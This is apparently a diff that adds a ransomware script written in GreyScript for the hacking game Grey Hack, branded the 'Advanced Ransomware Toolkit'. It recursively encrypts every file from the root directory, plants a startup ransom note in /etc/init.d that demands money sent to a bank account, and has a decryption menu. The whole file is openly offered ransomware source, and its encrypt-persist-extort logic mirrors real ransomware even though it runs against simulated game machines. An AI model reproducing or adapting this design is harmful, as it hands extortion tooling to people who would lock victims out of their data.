@@ -1,0 +1,189 @@
+// [A]DVANCED [R]ANSOMWARE [T]OOLKIT
+clear_screen
+crypto = include_lib("/lib/crypto.so")
+if not crypto then crypto = include_lib(current_path + "/crypto.so")
+if not crypto then exit("[ART] Crypto Lib not found.")
+decryptlist = function(lst, password)
+	print(lst.len)
+	i = 0
+	while i < lst.len
+    	rslt = crypto.decrypt(lst[i], password)
+		print(lst[i] + ": " + rslt)
+    	i = i + 1
+	end while
+end function
+ransom = function(pc, shell, password, bank, amount, contact)
+	print("Deploying Ransomware")
+	encrypt_all = function(folder)
+		for subfolder in folder.get_folders
+			encrypt_all(subfolder)
+		end for
+
+		for file in folder.get_files
+			if file.is_folder then continue
+            fp = file.path
+
+			if not crypto.is_encrypted(file.path) then
+				print("Encrypting: " + file.path)
+				crypto.encrypt(file.path, password)
+			else
+				print("Already encrypted: " + file.path)
+			end if
+		end for
+	end function
+	root = pc.File("/")
+	encrypt_all(root)
+	if not pc.File("/etc/init.d") then
+		pc.create_folder("/etc", "init.d")
+	end if
+	pc.touch("/etc/init.d", "ransom.src")
+	script = pc.File("/etc/init.d/ransom.src")
+	if script then
+		cont = "print('Youve been attacked by the Advanced Ransom Toolkit.')
+print('to get access to your files, transfer "+amount+" worth of money to "+bank+"')
+main = function()
+	crypto = include_lib('lib/crypto.so')
+    actions = user_input('Actions: \n\n1. About\n2. Who is the attacker?\n3. How do I view my files?\n4. Enter Decryption Key\n\nEnter Choice: ')
+    attacker = '"+bank+"'
+	amount = '"+amount+"'
+    contact = '"+contact+"'
+    if actions == '3' then print('All your files are encrypted except your crucial libraries, <b>/boot</b> folder & <b>FileExplorer.exe</b> which you can use to access <b>/usr/bin/</b>, There you will be able to access\n<b>Chat.exe</b>\n<b>Mail.exe</b>\n\nNotice: This program will open on startup.')
+    if actions == '1' then print('ART is a program that utilizes The encryption methods, it is probably the most advanced and easiest to use out there, if you want to use it yourself, check out the official grey hack discord server or the projects github page: <b>https://github.com/Maeteam/ART-greyhackgame/tree/main</b>')
+    if actions == '2' then print('<b>Contact Information:</b>\n'+contact+'\n<b>Bank account:</b> ' + attacker + '\n<b>Request: </b><color=#00fe17>'+amount+'</color> worth of money\nsearch on your system files to see if you have any files that may indicate additional information to get in contact and maybe lower the price.')
+    if actions == '4' then
+		shell = get_shell
+		pc = shell.host_computer
+        folder = pc.File('/')
+        key = user_input('Enter Key;')
+        decrypt_all = function(folder)
+			for subfolder in folder.get_folders
+				decrypt_all(subfolder)
+			end for
+
+			for file in folder.get_files
+				if file.is_folder then continue
+
+				if crypto.is_encrypted(file.path) then	
+					result = crypto.decrypt(file.path, key)
+					if result != 1 then main()
+					print('Decrypting: ' + file.path)
+				end if
+			end for
+		end function
+		folder = pc.File('/')
+		decrypt_all(folder)
+	end if
+    if actions then main()
+end function
+main()"
+		
+	end if
+	newcont = cont.replace("'", """")
+	script.set_content(newcont)
+	build(shell, "/etc/init.d/ransom.src", "/etc/init.d")
+	script.delete
+end function
+reset_ransom = function(pc, password)
+	print("Removing ransomware...")
+	decrypt_all = function(folder)
+		for subfolder in folder.get_folders
+			decrypt_all(subfolder)
+		end for
+		for file in folder.get_files
+			if file.is_folder then continue
+			if crypto.is_encrypted(file.path) then
+				result = crypto.decrypt(file.path, password)
+				if result != 1 then exit("Wrong Decryption Passcode")
+				print("Decrypting: " + file.path)
+			end if
+		end for
+	end function
+
+	// Start from root
+	root = pc.File("/")
+	decrypt_all(root)
+
+	script = pc.File("/etc/init.d/ransom")
+	if script then
+		print("Removing Note...")
+		script.delete
+	end if
+    fx = pc.File("/etc/init.d/FileExplorer.exe")
+	if fx then
+		print("Removing Leftovers...")
+		fx.delete
+	end if
+end function
+menu = function()
+	clear_screen
+	if active_user != "root" then
+		print("<color=#f36c02>Notice!\n<color=#f36c02>This Program needs root permissions.")
+    	rootpass = user_input("Enter Root Password: ", true)
+    	shell = get_shell("root", rootpass)
+    	if typeof(shell) != "shell" then
+			menu()
+    	end if
+    	shell.launch(program_path)
+    	exit // Exit current (non-root) instance
+	end if
+	print("<color=#dd95d7><b>		_______________________
+<color=#dd95d7><b>		___    |__  __ \__  __/
+<color=#dd95d7><b>		__  /| |_  /_/ /_  /   
+<color=#dd95d7><b>		_  ___ |  _, _/_  /    
+<color=#dd95d7><b>		/_/  |_/_/ |_| /_/     
+<color=#a0c8fa>[---]  </b>The Advanced Ransomware Toolkit  [---]
+<color=#a0c8fa>[---]  </b>By <color=#ec3333>XsisTz<color=#a0c8fa>  [---]")
+	print("Select from the menu: \n")
+	shell = get_shell
+	pc = host_computer(shell)
+	print("[1] Encrypt Computer\n[2] Decrypt Computer\n[3] Encrypt File\n[4] Decrypt File\n\n[99] Exit")
+	toolkit = user_input("\nEnter Choice: ")
+	if toolkit == "1" then
+		password = user_input("Enter Encryption Password: ")
+		amount = user_input("How much money worth in dollars: ")
+		bank = user_input("Bank Account to transfer: ")
+        contact = user_input("Contact Information: ")
+		ransom(pc, shell, password, bank, amount, contact)
+		exclude_files = ["/lib/crypto.so","/usr/bin/Terminal.exe", "/etc/init.d/FileExplorer.exe", "/etc/init.d/ransom", "/usr/bin/FileExplorer.exe", "/usr/bin/Mail.exe", "/usr/bin/Chat.exe", "/boot/System.map", "/boot/initrd.img", "/boot/kernel.img", "/lib/net.so", "/lib/init.so", "/lib/kernel_module.so"]
+		decryptlist(exclude_files, password)
+	else if toolkit == "2" then
+		password = user_input("Enter Decryption Password: ")
+		reset_ransom(pc, password)
+	else if toolkit == "3" then
+		pth = user_input("Enter File Path: ")
+		pth = pth.replace(" ", "")
+		fle = pc.File(pth)
+
+		if typeof(fle) == "null" then
+    		print("File not found: " + pth)
+			wait(1)
+			menu()
+		end if
+		password = user_input("Enter Encryption Password: ")
+		rslt = crypto.encrypt(fle.path, password)
+		if rslt == 1 then print("File Successfuly Encrypted")
+		if rslt == 0 then print("Could Encrypt File.")
+	else if toolkit == "4" then
+		pth = user_input("Enter File Path: ")
+		pth = pth.replace(" ", "")
+		fle = pc.File(pth)
+
+		if typeof(fle) == "null" then
+    		print("File not found: " + pth)
+			wait(1)
+			menu()
+		end if
+		password = user_input("Enter Decryption Password: ")
+		rslt = crypto.decrypt(fle.path, password)
+		if rslt == 1 then print("File Successfuly Decrypted")
+		if rslt == 0 then print("Couldnt Decrypt File.")
+	else if toolkit == "99" then
+		print("Quitting...")
+		wait(0.2)
+		exit
+	else
+		menu()
+    end if
+end function
+
+menu()
